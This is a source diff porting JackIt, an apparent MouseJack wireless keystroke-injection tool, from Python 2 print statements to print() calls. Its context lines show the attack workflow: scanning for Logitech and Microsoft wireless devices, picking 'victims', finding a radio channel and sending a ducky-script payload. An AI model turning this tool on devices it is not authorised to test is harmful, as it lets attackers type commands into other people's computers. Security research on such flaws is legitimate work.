@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+from __future__ import print_function
 import datetime
 import os
 import time
@@ -40,7 +41,7 @@ class JackIt(object):
 
     def _debug(self, text):
         if self.debug:
-            print P + "[D] " + W + text
+            print(P + "[D] " + W + text)
 
     def hexify(self, data):
         return ':'.join('{:02X}'.format(x) for x in data)
@@ -108,7 +109,7 @@ class JackIt(object):
                     self.add_device(a, payload)
 
         except RuntimeError:
-            print R + '[!] ' + W + 'Runtime error during scan'
+            print(R + '[!] ' + W + 'Runtime error during scan')
             exit(-1)
         return self.devices
 
@@ -148,7 +149,7 @@ class JackIt(object):
                     self.add_device(addr_string, payload)
 
         except RuntimeError:
-            print R + '[!] ' + W + 'Runtime error while sniffing'
+            print(R + '[!] ' + W + 'Runtime error while sniffing')
             exit(-1)
         return self.devices
 
@@ -217,24 +218,24 @@ class JackIt(object):
 
 
 def banner():
-    print r"""
+    print(r"""
      ____.              __   .___  __
     |    |____    ____ |  | _|   |/  |_
     |    \__  \ _/ ___\|  |/ /   \   __\
 /\__|    |/ __ \\  \___|    <|   ||  |
 \________(____  /\___  >__|_ \___||__|
-              \/     \/     \/          """
+              \/     \/     \/          """)
 
-    print "JackIt Version %0.2f" % __version__
-    print "Created by %s" % __authors__
-    print ""
+    print("JackIt Version %0.2f" % __version__)
+    print("Created by %s" % __authors__)
+    print("")
 
 
 def confirmroot():
     # make sure we are root
     if os.getuid() != 0:
-        print R + "[!] " + W + "ERROR: You need to run as root!"
-        print R + "[!] " + W + "login as root (su root) or try sudo ./jackit.py"
+        print(R + "[!] " + W + "ERROR: You need to run as root!")
+        print(R + "[!] " + W + "login as root (su root) or try sudo ./jackit.py")
         exit(-1)
 
 
@@ -253,30 +254,30 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
     confirmroot()
 
     if debug:
-        print O + "[W] " + W + "Debug is enabled."
+        print(O + "[W] " + W + "Debug is enabled.")
 
     if layout not in keymap.mapping.keys():
-        print R + '[!] ' + W + "Invalid keyboard layout selected."
+        print(R + '[!] ' + W + "Invalid keyboard layout selected.")
         exit(-1)
 
     targeted = False
     if address and not vendor:
-        print R + '[!] ' + W + "Please use --vendor option to specify either Logitech or Microsoft."
+        print(R + '[!] ' + W + "Please use --vendor option to specify either Logitech or Microsoft.")
         exit(-1)
     elif vendor and not address:
-        print R + '[!] ' + W + "Please use --address option when specifying a vendor."
+        print(R + '[!] ' + W + "Please use --address option when specifying a vendor.")
         exit(-1)
     elif vendor and address:
         vendor = vendor.lower()
         if not vendor.startswith("l") and not vendor.startswith("m"):
-            print R + '[!] ' + W + "Unknown vendor: specify either Microsoft of Logitech."
+            print(R + '[!] ' + W + "Unknown vendor: specify either Microsoft of Logitech.")
             exit(-1)
         else:
             targeted = True
 
     if script == "":
-        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
-        print R + '[!] ' + W + "Attacks are disabled."
+        print(R + '[!] ' + W + "You must supply a ducky script using --script <filename>")
+        print(R + '[!] ' + W + "Attacks are disabled.")
         attack = ""
     else:
         f = open(script, 'r')
@@ -288,21 +289,21 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
         jack = JackIt(lowpower, debug, reset)
     except Exception as e:
         if e.__str__() == "Cannot find USB dongle.":
-            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
-            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
+            print(R + "[!] " + W + "Cannot find Crazy PA USB dongle.")
+            print(R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware.")
             exit(-1)
         else:
             raise e
 
     try:
         if targeted:
-            print G + "[+] " + W + 'Starting sniff for %s...' % address
+            print(G + "[+] " + W + 'Starting sniff for %s...' % address)
             if vendor.startswith("l"):
                 jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
             if vendor.startswith("m"):
                 jack.add_device(address, [])
         else:
-            print G + "[+] " + W + 'Starting scan...'
+            print(G + "[+] " + W + 'Starting scan...')
 
         try:
             # Enter main loop
@@ -314,10 +315,10 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
 
                 click.clear()
                 if targeted:
-                    print GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready."
+                    print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
                 else:
-                    print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
-                print ""
+                    print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
+                print("")
 
                 idx = 0
                 pretty_devices = []
@@ -333,20 +334,20 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
                         jack.hexify(device['payload'])
                     ])
 
-                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
+                print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
         except KeyboardInterrupt:
-            print ""
+            print("")
 
         if 'devices' not in locals() or len(devices) == 0:
-            print R + "[!] " + W + "No devices found please try again..."
+            print(R + "[!] " + W + "No devices found please try again...")
             exit(-1)
 
         if attack == "":
-            print R + "[!] " + W + "No attack script was provided..."
+            print(R + "[!] " + W + "No attack script was provided...")
             exit(-1)
 
-        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
-            " separated by commas, or '%s': " % (G + 'all' + W),
+        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
+            " separated by commas, or '%s': " % (G + 'all' + W), end="")
         value = click.prompt('', default="all")
         value = value.strip().lower()
 
@@ -358,7 +359,7 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
                 if int(vic) <= len(pretty_devices):
                     victims.append(pretty_devices[(int(vic) - 1)])
                 else:
-                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
+                    print(R + "[!] " + W + ("Device %d key is out of range" % int(vic)))
 
         targets = []
         for victim in victims:
@@ -388,25 +389,25 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
                 lock_channel = jack.find_channel(address)
 
                 if lock_channel:
-                    print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
-                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
+                    print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
+                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel))
                     jack.attack(hid, attack)
                 else:
                     # If our pings fail, go full hail mary
-                    print R + '[-] ' + W + 'Ping failed, trying all channels'
+                    print(R + '[-] ' + W + 'Ping failed, trying all channels')
                     for channel in channels:
                         jack.set_channel(channel)
-                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
+                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel))
                         jack.attack(hid, attack)
             else:
-                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
+                print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
                 continue
 
-        print GR + '\n[+] ' + W + "All attacks completed\n"
+        print(GR + '\n[+] ' + W + "All attacks completed\n")
 
     except KeyboardInterrupt:
-        print '\n ' + R + '(^C)' + O + ' interrupted\n'
-        print "[-] Quitting"
+        print('\n ' + R + '(^C)' + O + ' interrupted\n')
+        print("[-] Quitting")
 
 
 if __name__ == '__main__':
